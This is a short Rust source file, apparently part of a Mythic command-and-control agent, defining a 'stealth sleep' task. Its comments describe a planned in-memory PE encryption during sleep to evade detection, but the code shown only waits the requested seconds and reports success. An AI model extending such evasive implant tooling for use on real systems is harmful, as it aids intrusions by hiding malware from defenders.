// Stealth sleep module
// When Kudaes/Shelter is integrated via Docker rebuild, this will encrypt
// the PE in memory during sleep. Currently uses standard thread sleep.

use crate::{AgentTask, mythic_success};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct StealthSleepArgs {
    interval: Option<u64>,
    encrypt_pe: Option<bool>,
}

pub fn do_stealth_sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

pub fn stealth_sleep(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: StealthSleepArgs = serde_json::from_str(&task.parameters)?;
    let interval = args.interval.unwrap_or(5);
    std::thread::sleep(std::time::Duration::from_secs(interval));
    Ok(mythic_success!(task.id, format!("Sleep completed ({} seconds)", interval)))
}
